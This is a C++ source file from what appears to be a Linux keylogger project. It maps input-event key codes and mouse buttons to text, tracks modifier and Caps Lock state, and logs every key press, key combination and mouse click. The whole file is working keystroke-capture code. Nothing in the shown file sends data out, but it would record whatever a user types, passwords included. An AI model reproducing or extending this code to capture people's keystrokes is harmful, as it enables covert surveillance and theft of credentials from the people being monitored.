//
// Created by ofir on 7/24/25.
//

#include <linux/input.h>
#include "KeyDecoder.hpp"


const std::unordered_map<int, std::string>  keylogger::KeyDecoder::m_mouse_button_mappings = {
    {BTN_LEFT, "[MOUSE_LEFT]"},
    {BTN_MIDDLE, "[MOUSE_MIDDLE]"},
    {BTN_RIGHT, "[MOUSE_RIGHT]"},
    {BTN_SIDE, "[MOUSE_SIDE]"},
    {BTN_EXTRA, "[MOUSE_EXTRA]"}
};

// Comprehensive key code to character mapping
const std::unordered_map<int, std::string> keylogger::KeyDecoder::m_key_mappings = {
    // Letters (will be modified by shift state)
    {KEY_A, "a"}, {KEY_B, "b"}, {KEY_C, "c"}, {KEY_D, "d"}, {KEY_E, "e"},
    {KEY_F, "f"}, {KEY_G, "g"}, {KEY_H, "h"}, {KEY_I, "i"}, {KEY_J, "j"},
    {KEY_K, "k"}, {KEY_L, "l"}, {KEY_M, "m"}, {KEY_N, "n"}, {KEY_O, "o"},
    {KEY_P, "p"}, {KEY_Q, "q"}, {KEY_R, "r"}, {KEY_S, "s"}, {KEY_T, "t"},
    {KEY_U, "u"}, {KEY_V, "v"}, {KEY_W, "w"}, {KEY_X, "x"}, {KEY_Y, "y"},
    {KEY_Z, "z"},
    // Numbers (unshifted and shifted versions)
    {KEY_1, "1"}, {KEY_2, "2"}, {KEY_3, "3"}, {KEY_4, "4"}, {KEY_5, "5"},
    {KEY_6, "6"}, {KEY_7, "7"}, {KEY_8, "8"}, {KEY_9, "9"}, {KEY_0, "0"},
    // Symbols (unshifted and shifted versions)
    {KEY_MINUS, "-"}, {KEY_EQUAL, "="}, {KEY_LEFTBRACE, "["}, {KEY_RIGHTBRACE, "]"},
    {KEY_SEMICOLON, ";"}, {KEY_APOSTROPHE, "'"}, {KEY_GRAVE, "`"}, {KEY_BACKSLASH, "\\"},
    {KEY_COMMA, ","}, {KEY_DOT, "."}, {KEY_SLASH, "/"},
    // Special keys
    {KEY_SPACE, " "}, {KEY_ENTER, "\n"}, {KEY_TAB, "\t"}, {KEY_BACKSPACE, "[BACKSPACE]"},
    {KEY_ESC, "[ESC]"}, {KEY_CAPSLOCK, "[CAPSLOCK]"}, {KEY_LEFTCTRL, "[LEFT_CTRL]"},
    {KEY_RIGHTCTRL, "[RIGHT_CTRL]"}, {KEY_LEFTALT, "[LEFT_ALT]"}, {KEY_RIGHTALT, "[RIGHT_ALT]"},
    {KEY_LEFTSHIFT, "[LEFT_SHIFT]"}, {KEY_RIGHTSHIFT, "[RIGHT_SHIFT]"}, {KEY_LEFTMETA, "[META]"},
    {KEY_RIGHTMETA, "[META]"}, {KEY_COMPOSE, "[COMPOSE]"}, {KEY_NUMLOCK, "[NUMLOCK]"},
    {KEY_SCROLLLOCK, "[SCROLLLOCK]"}, {KEY_SYSRQ, "[SYSRQ]"}, {KEY_PAUSE, "[PAUSE]"},
    {KEY_INSERT, "[INSERT]"}, {KEY_HOME, "[HOME]"}, {KEY_PAGEUP, "[PAGEUP]"},
    {KEY_DELETE, "[DEL]"}, {KEY_END, "[END]"}, {KEY_PAGEDOWN, "[PAGEDOWN]"},
    {KEY_UP, "[UP]"}, {KEY_DOWN, "[DOWN]"}, {KEY_LEFT, "[LEFT]"}, {KEY_RIGHT, "[RIGHT]"},
    {KEY_F1, "[F1]"}, {KEY_F2, "[F2]"}, {KEY_F3, "[F3]"}, {KEY_F4, "[F4]"},
    {KEY_F5, "[F5]"}, {KEY_F6, "[F6]"}, {KEY_F7, "[F7]"}, {KEY_F8, "[F8]"},
    {KEY_F9, "[F9]"}, {KEY_F10, "[F10]"}, {KEY_F11, "[F11]"}, {KEY_F12, "[F12]"},
    {KEY_KPASTERISK, "*"}, {KEY_KPPLUS, "+"}, {KEY_KPMINUS, "-"}, {KEY_KPSLASH, "/"},
    {KEY_KPDOT, "."}, {KEY_KP0, "0"}, {KEY_KP1, "1"}, {KEY_KP2, "2"}, {KEY_KP3, "3"},
    {KEY_KP4, "4"}, {KEY_KP5, "5"}, {KEY_KP6, "6"}, {KEY_KP7, "7"}, {KEY_KP8, "8"},
    {KEY_KP9, "9"}, {KEY_KPENTER, "[KPENTER]"}
};

// Shift-modified characters for number and symbol keys
const std::unordered_map<int, std::string> keylogger::KeyDecoder::m_shifted_mappings = {
    {KEY_1, "!"}, {KEY_2, "@"}, {KEY_3, "#"}, {KEY_4, "$"}, {KEY_5, "%"},
    {KEY_6, "^"}, {KEY_7, "&"}, {KEY_8, "*"}, {KEY_9, "("}, {KEY_0, ")"},
    {KEY_MINUS, "_"}, {KEY_EQUAL, "+"}, {KEY_LEFTBRACE, "{"}, {KEY_RIGHTBRACE, "}"},
    {KEY_SEMICOLON, ":"}, {KEY_APOSTROPHE, "\""}, {KEY_GRAVE, "~"}, {KEY_BACKSLASH, "|"},
    {KEY_COMMA, "<"}, {KEY_DOT, ">"}, {KEY_SLASH, "?"}
};

keylogger::KeyDecoder::KeyDecoder(Logger& logger) : m_logger(logger)
{}

std::string keylogger::KeyDecoder::GetKeyName(int code, bool shifted) const
{
    if (!m_key_mappings.contains(code))
    {
        return "[UNKNOWN:" + std::to_string(code) + "]";
    }

    // Handle letters (A-Z)
    if (code >= KEY_A && code <= KEY_Z)
    {
        std::string base = m_key_mappings.at(code);
        // Always uppercase when shifted, regardless of caps lock
        if (shifted)
        {
            return std::string(1, toupper(base[0]));
        }
        // Lowercase unless caps lock is on (without shift)
        return m_caps_lock ? std::string(1, toupper(base[0])) : base;
    }

    // Handle shifted symbols and numbers
    if (shifted && m_shifted_mappings.contains(code))
    {
        return m_shifted_mappings.at(code);
    }

    return m_key_mappings.at(code);
}

std::string keylogger::KeyDecoder::GetMouseButtonName(int code)
{
    if (m_mouse_button_mappings.contains(code))
    {
        return m_mouse_button_mappings.at(code);
    }
    return "[MOUSE_UNKNOWN:" + std::to_string(code) + "]";
}

void keylogger::KeyDecoder::ProcessMouseEvent(int code, int value) const
{
    if (value != 1)
    {
        return; // Only log button presses
    }

    const std::string button_name = GetMouseButtonName(code);
    m_logger.Log("Mouse: " + button_name + " CLICK");
}

//TODO Fix!
void keylogger::KeyDecoder::ProcessKeyEvent(int code, int value)
{
    // Update modifier states
    if (code == KEY_LEFTCTRL || code == KEY_RIGHTCTRL)
    {
        m_ctrl_pressed = (value == 1 || value == 2);  // 1=press, 2=repeat
    }
    else if (code == KEY_LEFTALT || code == KEY_RIGHTALT)
    {
        m_alt_pressed = (value == 1 || value == 2);
    }
    else if (code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT)
    {
        m_shift_pressed = (value == 1 || value == 2);
    }
    else if (code == KEY_LEFTMETA || code == KEY_RIGHTMETA)
    {
        m_meta_pressed = (value == 1 || value == 2);
    }
    else if (code == KEY_CAPSLOCK && value == 1)
    {
        m_caps_lock = !m_caps_lock; // Toggle on key press
        m_logger.Log("Modifier: [CAPSLOCK] " + std::string(m_caps_lock ? "ON" : "OFF"));
    }

    // Only log key presses (ignore releases and repeats for non-modifiers)
    if (value != 1 &&
        code != KEY_LEFTCTRL && code != KEY_RIGHTCTRL &&
        code != KEY_LEFTALT && code != KEY_RIGHTALT &&
        code != KEY_LEFTSHIFT && code != KEY_RIGHTSHIFT &&
        code != KEY_LEFTMETA && code != KEY_RIGHTMETA) {
        return;
        }

    const std::string key_name = GetKeyName(code, m_shift_pressed);

    // Build combination string
    std::string combination;
    if (m_ctrl_pressed)
    {
        combination += "Ctrl+";
    }
    if (m_alt_pressed)
    {
        combination += "Alt+";
    }
    if (m_meta_pressed)
    {
        combination += "Meta+";
    }
    combination += key_name;

    // Special handling for modifier-only events
    if (code == KEY_LEFTCTRL || code == KEY_RIGHTCTRL ||
        code == KEY_LEFTALT || code == KEY_RIGHTALT ||
        code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT ||
        code == KEY_LEFTMETA || code == KEY_RIGHTMETA) {
        m_logger.Log("Modifier: " + combination + (value == 1 ? " PRESSED" : " RELEASED"));
        } else {
            m_logger.Log("Key: " + combination);
        }
}